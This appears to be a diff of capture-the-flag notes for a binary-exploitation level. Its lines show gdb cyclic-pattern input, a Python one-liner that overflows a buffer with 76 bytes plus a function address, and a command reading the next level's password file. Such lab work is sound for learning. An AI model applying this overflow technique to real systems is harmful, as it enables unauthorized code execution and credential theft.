@@ -40,7 +40,7 @@ Code:
 objdump -d ./level1
 gdb level1
     r A # run with argument
-(gdb)  r <<< "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac"
+(gdb)  r  <<< Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 (python -c 'print "a" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
 cat /home/user/level2/.pass
 
@@ -59,7 +59,7 @@ main
 
 
 run
-08048444 <run>:
+08048444 <run>: # run function address
  8048444:       55                      push   %ebp
  8048445:       89 e5                   mov    %esp,%ebp
  8048447:       83 ec 18                sub    $0x18,%esp
